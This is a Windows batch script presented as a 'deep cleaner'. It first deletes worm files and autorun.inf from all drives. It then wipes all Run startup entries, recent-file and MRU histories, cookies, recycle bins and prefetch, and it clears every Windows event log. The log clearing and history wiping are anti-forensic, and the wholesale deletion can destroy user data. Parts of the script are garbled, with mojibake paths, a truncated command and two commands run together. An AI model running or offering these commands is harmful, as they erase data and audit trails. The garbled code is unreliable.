DEL /F /Q /A -R -H -S -A %SysDir%\SXS.EXE
DEL /F /Q /A -R -H -S -A %SysDir%\SVOHOST.EXE
DEL /F /Q /A -R -H -S -A %SysDir%\WINSCOK.DLL
ATTRIB -R -H -S -A %WinDir%\SXS.EXE
ATTRIB -R -H -S -A %WinDir%\SVOHOST.EXE
ATTRIB -R -H -S -A %WinDir%\WINSCOK.DLL
DEL /F /Q /A -R -H -S -A %WinDir%\SXS.EXE
DEL /F /Q /A -R -H -S -A %WinDir%\SVOHOST.EXE
DEL /F /Q /A -R -H -S -A %WinDir%\WINSCOK.DLL
ATTRIB -R -H -S -A %WinDir%\System\SXS.EXE
ATTRIB -R -H -S -A %WinDir%\System\SVOHOST.EXE
ATTRIB -R -H -S -A %WinDir%\System\WINSCOK.DLL
DEL /F /Q /A -R -H -S -A %WinDir%\System\SXS.EXE
DEL /F /Q /A -R -H -S -A %WinDir%\System\SVOHOST.EXE
DEL /F /Q /A -R -H -S -A %WinDir%\System\WINSCOK.DLL
ATTRIB -R -H -S -A %SysDir%\dllcache\SXS.EXE
ATTRIB -R -H -S -A %SysDir%\dllcache\SVOHOST.EXE
ATTRIB -R -H -S -A %SysDir%\dllcache\WINSCOK.DLL
DEL /F /Q /A -R -H -S -A %SysDir%\dllcache\SXS.EXE
DEL /F /Q /A -R -H -S -A %SysDir%\dllcache\SVOHOST.EXE
DEL /F /Q /A -R -H -S -A %SysDir%\dllcache\WINSCOK.DLL
FOR %%a IN ( C: D: E: F: G: H: I: J: K: L: M: N: O: P: Q: R: S: T: U: V: W: X: Y: Z: ) DO ATTRIB -R -H -S -A %%a\SXS.EXE & DEL /F /Q /A -R -H -S -A %%a\SXS.EXE & ATTRIB -R -H -S -A %%a\AUTORUN.INF & DEL /F /Q /A -R -H -S -A %%a\AUTORUN.INF
ECHO Windows Registry Editor Version 5.00>SoundMam.reg
ECHO [-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SoundMam]>>SoundMam.reg
ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>SoundMam.reg
ECHO "SoundMam"=->>SoundMam.reg
REGEDIT /S SoundMam.reg
DEL /F /Q SoundMam.reg
REGEDIT /S SHOWALL.reg
DEL /F /Q SHOWALL.reg
reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /va /f
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /va /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v ctfmon.exe /d C:\WINDOWS\system32\ctfmon.exe
reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v command /d ""C:\WINDOWS\IME\imjp8_1\IMJPMIG.EXE" /Spoil /RemAdvDef /Migration32"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v hkey /d HKLM
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v inimapping /d 0
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v item /d IMJPMIG
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\IMJPMIG8.1" /v key /d SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v command /d "C:\WINDOWS\system32\IME\TINTLGNT\TINTSETP.EXE /IMEName"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v hkey /d HKLM
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v inimapping /d 0
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v item /d TINTSETP
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002A" /v key /d SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v command /d ""C:\WINDOWS\IME\imjp8_1\IMJPMIG.EXE" /Spoil /RemAdvDef /Migration32"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v hkey /d HKLM
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v inimapping /d 0
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v item /d TINTSETP
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Shared Tools\MSConfig\startupreg\PHIME2002ASync" /v key /d SOFTWARE\Microsoft\Windows\CurrentVersion\Run
del "C:\Documents and Settings\All Users\ظ…â‚¬إ’ظ‡آ¼â‚¬ظ‡آ§â€¹ظ…â‚¬ع†أ¨عˆإ“ظ‡ع†â€¢\أ§آ¨â€¹ظ‡ط›عˆ\ظ‡ع¯آ¯ظ‡ظ¹آ¨\*.*" /q /f
del "C:\Documents and Settings\Default User\ظ…â‚¬إ’ظ‡آ¼â‚¬ظ‡آ§â€¹ظ…â‚¬ع†أ¨عˆإ“ظ‡ع†â€¢\أ§آ¨â€¹ظ‡ط›عˆ\ظ‡ع¯آ¯ظ‡ظ¹آ¨\*.*" /q /f
del "%userprofile%\ظ…â‚¬إ’ظ‡آ¼â‚¬ظ‡آ§â€¹ظ…â‚¬ع†أ¨عˆإ“ظ‡ع†â€¢\أ§آ¨â€¹ظ‡ط›عˆ\ظ‡ع¯آ¯ظ‡ظ¹آ¨\*.*" /q /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\Folder" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.txt" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.rar" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.mp3" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.jpg" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.ini" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.bmp" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.doc" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.eip" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.htm" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.ico" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.inf" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.gif" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.wav" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.xls" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs\.rm" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedMRU" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU\*" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU\mp3" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU\rm" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU\wav" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU\bat" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU\exe" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU\eip" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU\ico" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU\htm" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU\jpg" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StreamMRU" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{5E6AB780-7743-11CF-A12B-00AA004AE837}\Count" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{75048700-EF1F-11D0-9888-006097DEACF9}\Count" /va /f >nul 2>nul

reg delete "HKCU\Software\WinRAR\ArcHistory" /va /f >nul 2>nul

reg delete "HKCU\Software\WinRAR\DialogEditHistory\ArcName" /va /f >nul 2>nul

reg delete "HKCU\Software\WinRAR\DialogEditHistory\ExtrPath" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\MediaPlayer\Player\RecentFileList" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Microsoft Management Console\Recent File List" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Office\11.0\PowerPoint\Recent File List" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Office\11.0\Excel\Recent File" /va /f >nul 2>nul

reg delete "HKCU\Software\Microsoft\Office\11.0\Word\Data" /v "Settings" /f >nul 2>nul

reg delete "HKCU\Software\VMware, Inc." /va /f >nul 2>nul
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\WorkgroupCrawler\Shares" /f >nul 2>nul
@echo off&setlocal enabledelayedexpansion

for /f "delims=\" %%i in ('fsutil fsinfo drives^|find ""') do (

set drive_=%%i

fsutil fsinfo drivetype !drive_:~0,2!|find "ظ‡â€؛ط›ظ‡آ®ع‘">nul && del /a /f /q /s !drive_:~0,2!\Thumbs.db

)
reg query "HKCU\software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v Cache>%temp%\cleantmp.txt

reg query "HKCU\software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v Cookies>>%temp%\cleantmp.txt

reg query "HKCU\software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v History>>%temp%\cleantmp.txt

reg query "HKCU\software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v NetHood>>%temp%\cleantmp.txt

reg query "HKCU\software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v Recent>>%temp%\cleantmp.txt

CLEANMGR /sagerun
el /f /s /q %systemdrive%\*.tmp
del /f /s /q %systemdrive%\*._mp
del /f /s /q %systemdrive%\*.log >nul 2>nul
del /f /s /q %systemdrive%\*.gid
del /f /s /q %systemdrive%\*.chk
del /f /s /q %systemdrive%\*.old
del /f /s /q %systemdrive%\recycled\*.*
del /f /s /q %windir%\*.bak
del /f /s /q %windir%\prefetch\*.*
del /f /q %userprofile%\cookies\*.*
del /f /q %userprofile%\recent\*.*
del /f /s /q "%userprofile%\Local Settings\Temporary Internet Files\*.*"
del /f /q "%userprofile%\AppData\Local\Microsoft\Windows\Temporary Internet Files\*.*"
del /f /s /q "%userprofile%\Local Settings\Temp\*.*"
del /f /s /q "%userprofile%\recent\*.*"
rd /s /q %windir%\temp & md %windir%\tempdel /f /s /q %systemdrive%\*.tmp
del /q /f /s "%USERPROFILE%\AppData\Local\Temp\Excel8.0\*.exdâ€‌
del /q /f /s "%USERPROFILE%\AppData\Roaming\Microsoft\Office\*.tmp"
del /s /q C:\Windows\temp\*
del /f /s /q "%userprofile%\recent\*.*"
del /q /f /s "%USERPROFILE%\AppData\Local\Temp\*.*"
rd /s /q %windir%\temp & md %windir%\temp
del /q/f/s %TEMP%\*
rd /s /q c:\windows\temp
md c:\windows\temp
del /s /f /q C:\WINDOWS\Prefetch
del /s /f /q %temp%\*.*
md %temp%
del c:\WIN386.SWP
Del /S /F /Q %Windir%\Temp
Del /S /F /Q %temp%
echo of |clip
rd /q /s c:\$Recycle.Bin
rd /q /s d:\$Recycle.Bin
del *.log /a /s /q /f
del /s /f /q C:\ProgramData\Tencent
del /s /f /q c:\Windows\Prefetch
del /s /f /q C:\aow_drv.log
deltree /y c:\windows\tempor~1
deltree /y c:\windows\temp
deltree /y c:\windows\tmp
deltree /y c:\windows\ff*.tmp
deltree /y c:\windows\history
deltree /y c:\windows\cookies
deltree /y c:\windows\recent
deltree /y c:\windows\spool\printers
CLEANMGR /sagerun:
ECHO ========================================= Processed Successfully ==========================================
ECHO
ECHO ============================================= [DEEP CLEANER] ==============================================
del c:\WIN386.SWP
FOR /F "tokens=1, 2 * " %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F " tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared! ^<press any key^>
goto theEnd
:do_clear
echo clearing %1
wevtutil.exe cl %1
goto :eof
ECHO ========================================= Processed Successfully ==========================================
ECHO
ECHO
